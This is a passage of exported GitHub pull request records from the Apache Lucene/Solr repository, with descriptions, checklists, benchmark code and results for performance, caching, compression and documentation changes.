`./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","deanpearce","2021-03-04T23:05:19Z","2021-03-09T23:40:00Z"
"","2211","SOLR-13105: Add Visual Guide to Math Expressions","# Description  Merges the Visual Guide to Math Expressions written by Joel Bernstein. This includes extensive new documentation for streaming expressions and many visualizations using Zeppelin.  # Tests  N/A","closed","","ctargett","2021-01-15T21:54:29Z","2021-01-20T18:53:19Z"
"","1667","SOLR-14645 Make FileListEntityProcessor streaming to prevent OOM","# Description  Make FileListEntityProcessor streaming (as opposed to the current memory-hungry approach) to prevent OOM when processing files upwards of some 100K.  # Solution  Use Java 8 Streams and NIO2 to reduce memory footprint of listing files  # Tests  Existing tests do not fail  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [ ] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `ant precommit` and the appropriate test suite. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","mbolis","2020-07-13T11:01:57Z","2020-10-21T11:08:09Z"
"","2412","LUCENE-9737: Flexible configuration for DocValue compressions","# Description  LUCENE-9211 added compression for Binary DocValues. LUCENE-9663 added compression for Terms Dict from SortedSet/Sorted DocValues. LUCENE-9378 made Binary DocValues compression configurable, it introduced two modes for DocValues(Similar with the two modes from Lucene87StoredFieldsFormat):  - BEST_SPEED - BEST_COMPRESSION  It's simple to use...so Terms-dict compression shares the same configuration before this PR.But some users may only want to try Terms Dict compression, since Binary DocValue compression may cause performance reduction..  So we need to make configuration flexible.   # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","jaisonbi","2021-02-22T08:18:44Z","2021-03-01T02:42:21Z"
"","2345","Benchmark custom","# Description  Lucene Benchmark Scaling Problem with Reuters Corpus  While Indexing 1 million documents with reuters21578 (plain text Document derived from reuters21578 corpus), we observed that with higher number of Index threads, the Index throughput does not scale and degrades. Existing implementation with synchronization block allows only one thread to pick up a document/file from list, at any given time – this code is part of getNextDocData() in ReutersContentSource.java. With multiple index threads, this becomes a thread contention bottleneck and does not allow the system CPU resource to be used efficiently.  # Solution We developed a strategy to distribute total number of files across multiple number of Indexing threads, so that these threads work independently and parallelly.  # Tests  We mainly modified existing getNextDocData(), which is not altering  functionality, hence not added any new test cases.  - Passed existing tests  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability.    [ ] I have created a Jira issue and added the issue ID to my pull request title.  - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`.   [ ] I have added tests for my changes.   [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","open","","balmukundblr","2021-02-10T16:19:20Z","2021-03-05T10:06:21Z"
"","2350","SOLR-15149: model creation errors fixes","# Description  LTR integration gives obsvure and misleading error messages when creating models under certain circumstances  # Solution  better exception handling  # Tests  Tests to cover the exceptional use cases have been added  # Checklist  Please review the following and check all that apply:  - [X] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [X] I have created a Jira issue and added the issue ID to my pull request title. - [X] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [X] I have developed this patch against the `master` branch. - [X] I have run `./gradlew check`. - [X] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","alessandrobenedetti","2021-02-10T22:09:22Z","2021-02-15T17:02:41Z"
"","2349","Added FlushIndexTask to flush documents at index thread level.","# Description  Longer completion time for Close Index call.  Once AddDoc task completes, Benchmark algo calls ForceMerge/CloseIndex task, which eventually allows all pending flushes to be completed. Since flushes during CloseIndex call are sequential, it takes longer time to complete and delays the overall Index completion time. While indexing 1 million documents with reuters21578 (plain text Document derived from reuters21578 corpus), we observed CloseIndex call takes around 35% of total time.  # Solution  Developed a new FlushIndexTask, which uses flushNextBuffer() Lucene API, to flush document at Index thread level, while not impacting any other Index threads. Adding this task in the algo file, immediately after AddDoc task, would ensure flushing all docs before calling ForceMerge/CloseIndex task.  With this solution in place, CloseIndex task time was reduced significantly and it also improved total time for Indexing.   # Tests  Since, we are using existing Lucene API - flushNextBuffer(), hence it already has test cases. -Passed existing tests  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability.   [ ] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","open","","balmukundblr","2021-02-10T17:39:12Z","2021-04-29T17:10:56Z"
"","1818","SOLR-14819 Trivial fix to inefficient iterator pattern","# Description  Infer, via Muse, [called out](https://console.muse.dev/result/TomMD/lucene-solr/01EH5WXS6C1RH1NFYHP6ATXTZ9?search=JsonSchemaValidator&tab=results) a few inefficient patterns which this PR fixes.  # Solution  The patters are:  ``` for(key in hashmap) doThing(hashmap.get(key)); ```  And the fix is:  ``` for(value in hashmap) doThing(value) ```  Pretty basic.  - [X ] I have created a Jira issue and added the issue ID to my pull request title. - [X ] I have developed this patch against the `master` branch.","closed","","TomMD","2020-09-02T04:55:47Z","2020-09-03T10:08:25Z"
"","2113","LUCENE-9629: Use computed masks","# Description  In the class ForUtil, mask values have been computed and stored in static final vailables, but they are recomputed for each encoding, maybe we can avoid this~  # Solution  use the computed mask values","closed","","gf2121","2020-12-02T11:40:50Z","2020-12-18T15:15:29Z"
"","2139","LUCENE-9636: Extract and operation to get a SIMD optimize","# Description  In `decode6()` `decode7()` `decode12()` `decode14()` `decode15()` `decode24()`, longs always `&` a same mask and do some shift. By printing assemble language, i find that JIT did not optimize them with SIMD instructions. But when we extract all `&` operations and do them first, JIT will use SIMD to optimize them.   # Tests  Java Version:  > java version ""11.0.6"" 2020-01-14 LTS > Java(TM) SE Runtime Environment 18.9 (build 11.0.6+8-LTS) > Java HotSpot(TM) 64-Bit Server VM 18.9 (build 11.0.6+8-LTS, mixed mode)  ## Method Benchmark  Using `decode15()` as an example, here is a microbenchmark based on JMH: **code:** ```     @Benchmark     @BenchmarkMode({Mode.Throughput})     @Fork(1)     @Measurement(iterations = 10, time = 1, timeUnit = TimeUnit.SECONDS)     @Warmup(iterations = 3, time = 1, timeUnit = TimeUnit.SECONDS)     public void decode15a() {         for (int iter = 0, tmpIdx = 0, longsIdx = 30; iter < 2; ++iter, tmpIdx += 15, longsIdx += 1) {             long l0 = (TMP[tmpIdx+0] & MASK16_1) << 14;             l0 |= (TMP[tmpIdx+1] & MASK16_1) << 13;             l0 |= (TMP[tmpIdx+2] & MASK16_1) << 12;             l0 |= (TMP[tmpIdx+3] & MASK16_1) << 11;             l0 |= (TMP[tmpIdx+4] & MASK16_1) << 10;             l0 |= (TMP[tmpIdx+5] & MASK16_1) << 9;             l0 |= (TMP[tmpIdx+6] & MASK16_1) << 8;             l0 |= (TMP[tmpIdx+7] & MASK16_1) << 7;             l0 |= (TMP[tmpIdx+8] & MASK16_1) << 6;             l0 |= (TMP[tmpIdx+9] & MASK16_1) << 5;             l0 |= (TMP[tmpIdx+10] & MASK16_1) << 4;             l0 |= (TMP[tmpIdx+11] & MASK16_1) << 3;             l0 |= (TMP[tmpIdx+12] & MASK16_1) << 2;             l0 |= (TMP[tmpIdx+13] & MASK16_1) << 1;             l0 |= (TMP[tmpIdx+14] & MASK16_1) << 0;             ARR[longsIdx+0] = l0;         }     }      @Benchmark     @BenchmarkMode({Mode.Throughput})     @Fork(1)     @Measurement(iterations = 10, time = 1, timeUnit = TimeUnit.SECONDS)     @Warmup(iterations = 3, time = 1, timeUnit = TimeUnit.SECONDS)     public void decode15b() {         shiftLongs(TMP, 30, TMP, 0, 0, MASK16_1);         for (int iter = 0, tmpIdx = 0, longsIdx = 30; iter < 2; ++iter, tmpIdx += 15, longsIdx += 1) {             long l0 = TMP[tmpIdx+0] << 14;             l0 |= TMP[tmpIdx+1] << 13;             l0 |= TMP[tmpIdx+2] << 12;             l0 |= TMP[tmpIdx+3] << 11;             l0 |= TMP[tmpIdx+4] << 10;             l0 |= TMP[tmpIdx+5] << 9;             l0 |= TMP[tmpIdx+6] << 8;             l0 |= TMP[tmpIdx+7] << 7;             l0 |= TMP[tmpIdx+8] << 6;             l0 |= TMP[tmpIdx+9] << 5;             l0 |= TMP[tmpIdx+10] << 4;             l0 |= TMP[tmpIdx+11] << 3;             l0 |= TMP[tmpIdx+12] << 2;             l0 |= TMP[tmpIdx+13] << 1;             l0 |= TMP[tmpIdx+14] << 0;             ARR[longsIdx+0] = l0;         }     } ``` **Result:** ``` Benchmark               Mode  Cnt          Score         Error  Units MyBenchmark.decode15a  thrpt   10   65234108.600 ± 1336311.970  ops/s MyBenchmark.decode15b  thrpt   10  106840656.363 ±  448026.092  ops/s ```  ## End-to-end Benchmark An end-to-end benchmark based on _wikimedium1m_ also looks positive overall: ```                   Fuzzy1      131.77      (5.4%)      131.75      (4.2%)   -0.0% (  -9% -   10%) 0.990                MedPhrase      146.41      (4.5%)      146.44      (4.8%)    0.0% (  -8% -    9%) 0.992               AndHighMed      643.10      (5.4%)      643.95      (5.5%)    0.1% ( -10% -   11%) 0.939             HighSpanNear      125.99      (5.7%)      126.48      (4.9%)    0.4% (  -9% -   11%) 0.818                  Respell      164.81      (4.9%)      165.48      (4.5%)    0.4% (  -8% -   10%) 0.783         HighSloppyPhrase      103.20      (6.2%)      103.65      (5.8%)    0.4% ( -10% -   13%) 0.816                   IntNRQ      662.80      (5.0%)      665.87      (5.1%)    0.5% (  -9% -   11%) 0.770                  Prefix3      882.57      (6.8%)      887.18      (8.6%)    0.5% ( -13% -   17%) 0.832          LowSloppyPhrase       76.17      (5.5%)       76.57      (5.0%)    0.5% (  -9% -   11%) 0.754              AndHighHigh      236.71      (5.8%)      237.99      (5.2%)    0.5% (  -9% -   12%) 0.756                   Fuzzy2      100.40      (5.6%)      101.02      (4.7%)    0.6% (  -9% -   11%) 0.708               OrHighHigh      154.05      (5.4%)      155.08      (5.0%)    0.7% (  -9% -   11%) 0.684                LowPhrase      327.86      (4.4%)      330.10      (4.9%)    0.7% (  -8% -   10%) 0.641 BrowseDayOfYearSSDVFacets      120.00      (5.1%)      120.88      (4.5%)    0.7% (  -8% -   10%) 0.627                  MedTerm     2239.68      (6.3%)     2256.94      (5.9%)    0.8% ( -10% -   13%) 0.690                  LowTerm     2516.56      (6.1%)     2537.04      (6.3%)    0.8% ( -10% -   14%) 0.679                OrHighMed      594.85      (6.7%)      599.76      (5.2%)    0.8% ( -10% -   13%) 0.664          MedSloppyPhrase      256.82      (5.2%)      259.03      (5.1%)    0.9% (  -9% -   11%) 0.601                 PKLookup      221.95      (6.2%)      223.88      (5.6%)    0.9% ( -10% -   13%) 0.641    BrowseMonthSSDVFacets      135.72      (5.9%)      136.94      (5.4%)    0.9% (  -9% -   12%) 0.615              LowSpanNear      668.06      (6.4%)      674.95      (5.1%)    1.0% (  -9% -   13%) 0.572               AndHighLow     1603.74      (7.1%)     1621.34      (5.5%)    1.1% ( -10% -   14%) 0.585                 HighTerm     1927.72      (5.4%)     1949.95      (6.6%)    1.2% ( -10% -   13%) 0.547     HighIntervalsOrdered      293.62      (5.8%)      297.01      (5.0%)    1.2% (  -9% -   12%) 0.501               HighPhrase      396.34      (5.4%)      401.03      (5.4%)    1.2% (  -9% -   12%) 0.491                 Wildcard      749.60      (7.8%)      759.43      (8.9%)    1.3% ( -14% -   19%) 0.620              MedSpanNear      576.19      (5.8%)      584.48      (5.2%)    1.4% (  -9% -   13%) 0.407 BrowseDayOfYearTaxoFacets       32.34      (7.6%)       32.86      (8.0%)    1.6% ( -12% -   18%) 0.513     BrowseDateTaxoFacets       32.23      (7.7%)       32.76      (8.0%)    1.6% ( -13% -   18%) 0.512                OrHighLow      526.26      (6.7%)      536.54      (6.3%)    2.0% ( -10% -   16%) 0.342    BrowseMonthTaxoFacets       35.48      (9.1%)       36.21      (9.1%)    2.1% ( -14% -   22%) 0.474        HighTermMonthSort      349.19     (12.8%)      364.73     (14.0%)    4.5% ( -19% -   35%) 0.294    HighTermDayOfYearSort      690.75     (11.2%)      724.87     (11.0%)    4.9% ( -15% -   30%) 0.159 ```","closed","","gf2121","2020-12-10T10:23:55Z","2020-12-14T18:49:41Z"
"","2106","LUCENE-9624: fix duplicate compute on maxUnpatchedValue","# Description  in [LUCENE-9027](https://github.com/apache/lucene-solr/pull/973) lucene introduced SIMD to decode postings, which leaves a very small problem. since this is a hot way when indexing and searching, so fixing it may make a bit sense. i hope i can fix this problem as my first PR on this amazing project :)  detail:  maxUnpatchedValue has already computed apache.lucene.codecs.lucene84.PForUtil#encode line 64 ``` final long maxUnpatchedValue = (1L << patchedBitsRequired) - 1; ``` but this value is computed later again: apache.lucene.codecs.lucene84.PForUtil#encode line 74 ``` if (longs[i] > (1L << patchedBitsRequired) - 1) ... ```  # Solution  convert  apache.lucene.codecs.lucene84.PForUtil#encode line 74 ``` if (longs[i] > (1L << patchedBitsRequired) - 1) ... ``` to  ``` if (longs[i] > maxUnpatchedValue) ... ```  # Tests this is a really clear change, so tests may not be necessary ?  :)  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [ ] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [ ] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","gf2121","2020-11-30T12:27:06Z","2020-11-30T12:43:51Z"
"","2170","LUCENE-9648: Add a numbers query in sandbox that takes advantage of index sorting","# Description  In [LUCENE-6539](https://issues.apache.org/jira/browse/LUCENE-6539), we introduced DocValuesNumbersQuery to benefit some special cases (many terms/numbers and fewish matching hits). Inspired by [LUCENE-7714](https://issues.apache.org/jira/browse/LUCENE-7714), maybe we can speed it up when meeting index sort since we can do a binary search to bound the docvalues before iter it.   I'd like to raise another similary issue to add an `IndexSortDocValuesTermsQuery` if this can pass the review :)  # Benchmarks  I constructed some data by the following script: ``` Directory directory = FSDirectory.open(Paths.get(""./test"")); IndexWriter indexWriter = new IndexWriter(directory,         new IndexWriterConfig()                 .setOpenMode(IndexWriterConfig.OpenMode.CREATE_OR_APPEND)                 .setIndexSort(                         new Sort(new SortedNumericSortField(""a"", SortField.Type.LONG))                 )); for (int i = 0; i < TOTAL_DOC; i++) {     int a = random.nextInt(1000000000);     Document document = new Document();     document.add(new LongPoint(""a"", a));     document.add(new SortedNumericDocValuesField(""a"", a));     indexWriter.addDocument(document); }  indexWriter.flush(); indexWriter.commit(); indexWriter.close(); ``` And search them like this pattern: ``` @Benchmark @BenchmarkMode({Mode.AverageTime}) @Fork(1) @Measurement(iterations = 30) @Warmup(iterations = 10) public static void baseline(Blackhole blackhole) throws IOException {     for (int i = 0; i < termsLen; i++) {         terms[i] = random.nextInt(1000000000);     }     Query query = createQuery(""a"", terms);     AtomicInteger res = new AtomicInteger(0);     indexSearcher.search(query, new SimpleCollector() {         @Override         public void collect(int doc) throws IOException {             res.set(doc ^ res.get());         }          @Override         public ScoreMode scoreMode() {             return ScoreMode.COMPLETE_NO_SCORES;         }     });     blackhole.consume(res.get()); } ``` **Note**: the random seed search used is the same with writing, so each long in the query can hit at least one doc.  ## Results:  **Based on 50,000,000 doc:** LongsCount | PointInSetQuery(s/op) | IndexSortDocValuesNumbersQuery(s/op) | DocValuesNumbersQuery(s/op) -- | -- | -- | -- 1000 | 0.144 ± 0.001 | 0.428 ± 0.008 | 1.159 ± 0.031 5000 | 0.404 ± 0.003 | 0.424 ± 0.008 | 1.343 ± 0.022 10000 | 0.661 ± 0.012 | 0.436 ± 0.008 | 1.372 ± 0.011 50000 | 1.319 ± 0.011 | 0.450 ± 0.005 | 1.173 ± 0.017 100000 | 1.328 ± 0.007 | 0.459 ± 0.003 | 1.160 ± 0.098  **Based on 100,000,000 doc:** LongsCount | PointInSetQuery(s/op) | IndexSortDocValuesNumbersQuery(s/op) | DocValuesNumbersQuery(s/op) -- | -- | -- | -- 1000 | 0.189 ± 0.003 | 0.860 ± 0.028 | 2.408 ± 0.087 5000 | 0.715 ± 0.010 | 0.879 ± 0.010 | 2.642 ± 0.105 10000 | 1.075 ± 0.034 | 0.859 ± 0.010 | 2.629 ± 0.077 50000 | 2.652 ± 0.114 | 0.865 ± 0.009 | 2.737 ± 0.099 100000 | 2.905 ± 0.027 | 0.881 ± 0.005 | 2.820 ± 0.474","closed","","gf2121","2020-12-27T09:18:56Z","2021-07-04T10:18:12Z"
"","2086","SOLR-14985: Slow indexing and search performance when using HttpClusterStateProvider","# Description  HttpClusterStateProvider fetches and caches Aliases and Live Nodes for 5 seconds. But all calls to getState are live. These collection states are supposed to be cached inside BaseSolrCloudClient but BaseSolrCloudClient only caches collection state if it is lazy which is never the case for states returned by HttpClusterStateProvider.  The BaseSolrCloudClient calls getState for each collection mentioned in the request thereby making a live http call. It also calls getClusterProperties() for each live node!  So overall, at least 4 HTTP calls are made to fetch cluster state for each update request when using HttpClusterStateProvider for searching or indexing. There may be more if aliases are involved or if more than one collection is specified in the request. Similar problems exist on the query path as well. Also, there are as many calls to fetch cluster properties made as the number of live nodes.  Due to these reasons, using HttpClusterStateProvider causes horrible latencies and throughput for update and search requests.  # Solution  This PR fixes BaseCloudSolrClient to cache collection states returned by HttpClusterStateProvider, reduce the number of calls to getClusterProperty in case of admin requests, replace usage of getClusterStateProvider().getState() with getDocCollection() which caches the collection state. Therefore the number of clusterstatus calls are reduced from 4 for each query/indexing to either one at max and usually 0 (if data is cached already).  # Tests  A new CountingHttpClusterStateProvider test class is added which can track the number of http calls made. This class is used in the HttpClusterStateProviderTest to track and assert the number of http calls made by HttpClusterStateProvider.  # Checklist  Please review the following and check all that apply:  - [X] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [X] I have created a Jira issue and added the issue ID to my pull request title. - [X] I have developed this patch against the `master` branch. - [X] I have run `./gradlew check`. - [X] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","open","","shalinmangar","2020-11-18T14:01:02Z","2020-11-18T18:33:00Z"
"","1858","LUCENE-6744: equals methods should compare classes directly, not use instanceof","# Description  Hey everyone, this is my first PR to Lucene/Solr.   Earlier, the equals method was asymmetrically comparing two objects with `instanceOf` whereas now it uses `getClass`. Note that I didn't change all of the files mentioned in this ticket.   # Solution  Instead of using `instanceOf` I used `getClass` in the `equals` method as described in the original Jira ticket  # Tests  Please describe the tests you've developed or run to confirm this patch implements the feature or solves the problem.  Currently, there are no tests that test this directly though I would appreciate any guidance on what is the best way to include tests for this if required.   # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","open","","PuneethBikkumanla","2020-09-11T04:36:01Z","2020-09-15T16:10:43Z"
"","2067","SOLR-14987: Reuse HttpSolrClient per node vs. one per Solr core when using CloudSolrStream","# Description  For collections with many shards (or aliases with many collections and some shards), `CloudSolrStream` will end up creating a new `HttpSolrClient` for every `SolrStream` it opens because the cache key is the full core URL, such as: `http://127.0.0.1:63460/solr/collection4_shard4_replica_n6/`  In addition, `CloudSolrStream#getSlices` was calling `clusterState.getCollectionsMap()` which pre-emptively loads all `LazyCollectionRef` from ZK unnecessarily. This could cause an issue with clusters with many collections and slow down the streaming expression execution.  # Solution  In this PR, I've introduced a new ctor in `SolrStream` to pass the Replica's `baseUrl` and `core` as separate parameters. This leads to reusing the same `HttpSolrClient` for the same node because the cache key is now `http://127.0.0.1:63460/solr/`. I chose this new ctor approach because `CloudSolrStream` is not the only consumer of `SolrStream` and it knows how the list of URLs where constructed from cluster state, so it can safely make the decision about passing the core and reusing clients.  When the request is sent to the remote core, we need to add the core name to the path. This happens in `SolrStream#constructParser`. This method was public and takes a SolrClient (even though SolrStream already has an HttpSolrClient created in the `open` method); I've changed the signature to be private and use the client opened in the `open` method.  # Tests  Added a new test `testCloudStreamClientCache` in `StreamingTest` to verify the SolrStreams created by the CloudStream have the correct baseUrl (without the core).  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","thelabdude","2020-11-06T21:53:51Z","2020-12-07T16:03:03Z"
"","2102","SOLR-14977: Fix typo in solr-upgrade-notes.adoc","# Description  Fixed small typo in release notes. Should refer to 8.7, not 8.6.x.","closed","","sarcanon","2020-11-27T17:03:32Z","2020-12-03T15:35:37Z"
"","2433","LUCENE-9639: Implements SimpleTextVectorReader#ramBytesUsed","# Description  Fix nightly test failure by implementing  SimpleTextVectorReader#ramBytesUsed  # Tests Passed nightly tests in `TestSimpleTextVectorFormat` ``` xichen@Xis-MacBook-Pro lucene-solr % ./gradlew  :lucene:codecs:test --tests=""org.apache.lucene.codecs.simpletext.TestSimpleTextVectorFormat"" -Ptests.nightly=true  > Task :randomizationInfo Running tests with randomization seed: tests.seed=7B222A36847DE944  > Task :lucene:codecs:test :lucene:codecs:test (SUCCESS): 40 test(s), 1 skipped The slowest tests (exceeding 500 ms) during this run:    5.71s TestSimpleTextVectorFormat.testRamBytesUsed (:lucene:codecs)  BUILD SUCCESSFUL in 12s 16 actionable tasks: 9 executed, 7 up-to-date ```  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","zacharymorn","2021-02-25T19:06:20Z","2021-02-26T02:32:54Z"
"","2328","SOLR-15145: System property to control whether base_url is stored in state.json to enable back-compat with older SolrJ versions","# Description  Fix for https://issues.apache.org/jira/browse/SOLR-15145  # Solution  Unfortunately, we don't have a lot of options with this issue. We could just go back to storing  `base_url` but I like the system property (could add an ENV var too) for installations that can upgrade their SolrJ to 8.8 as it helps get them closer to Solr 9.x where we don't store `base_url` but also gives the possibility to run an older SolrJ client version against an upgraded Solr 8.8 server.  # Tests  Tests still TBD ...  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [ ] I have developed this patch against the `master` branch. - [ ] I have run `./gradlew check`. - [ ] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","thelabdude","2021-02-08T22:41:02Z","2021-02-10T15:35:38Z"
"","2356","SOLR-15152: Export Tool should export nested docs cleanly in .json, .jsonl, and javabin","# Description  Export tool says it uses json, but it's actually a json lines format.   It ignores anonymous and nested docs.  # Solution  * Tweaked the writer to properly handle anonymous and regular nested docs when exporting data. * Renamed the existing `json` format to `jsonl`, and introduced a proper `json` format. * Introduce explicit DocSinks per format, `json`, `jsonl`, and `javabin`. * Create new configsets for testing under `nested/anonymous` and `nested/regular` for testing. * added nested products example that was used in the Ref guide to the example/exampledocs/office_products.json. * Changed `sample_techproducts_configs` to used explicit nested docs, not anonymous nested docs, and then fixed various tests that assumed anonymous children.  This was tough! * Updates to the Ref Guide.  Now, with the `json` format you can export and then reimport the Solr docs, including with child docs!  # Tests  I've added a new `TestExportToolWithNestedDocs`, and extended the existing `TestExportTool` tests.  The setup for the tests was quite different, so I didn't make them all one file.  I've updated the existing tests that   # Checklist  Please review the following and check all that apply:  - [ X] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [ X] I have created a Jira issue and added the issue ID to my pull request title. - [ X] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [ X] I have developed this patch against the `master` branch. - [ X] I have run `./gradlew check`. - [ X] I have added tests for my changes. - [ X] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","epugh","2021-02-11T18:44:41Z","2021-03-19T00:34:55Z"
"","2258","LUCENE-9686: Fix read past EOF handling in DirectIODirectory","# Description  Explicitly handle read past EOF case in DirectIODirectory#readByte to throw EOFException  # Solution  In DirectIODirectory.readByte, checks for `buffer.limit() == 0” after DirectIODirectory#refill was called.  # Tests  * Add a new test to for read past EOF scenario * Passed reported randomized test with `./gradlew test —tests TestDirectIODirectory.testFloatsUnderflow -Dtests.seed=73B56EAB13269C91 -Dtests.slow=true -Dtests.badapples=true -Dtests.locale=haw-US -Dtests.timezone=America/Inuvik -Dtests.asserts=true -Dtests.file.encoding=UTF-8` * Passed `./gradlew check`  # Checklist  Please review the following and check all that apply:  - [x] I have reviewed the guidelines for [How to Contribute](https://wiki.apache.org/solr/HowToContribute) and my code conforms to the standards described there to the best of my ability. - [x] I have created a Jira issue and added the issue ID to my pull request title. - [x] I have given Solr maintainers [access](https://help.github.com/en/articles/allowing-changes-to-a-pull-request-branch-created-from-a-fork) to contribute to my PR branch. (optional but recommended) - [x] I have developed this patch against the `master` branch. - [x] I have run `./gradlew check`. - [x] I have added tests for my changes. - [ ] I have added documentation for the [Ref Guide](https://github.com/apache/lucene-solr/tree/master/solr/solr-ref-guide) (for Solr changes only).","closed","","zacharymorn","2021-01-28T06:12:31Z","2021-02-02T08:07:31Z"
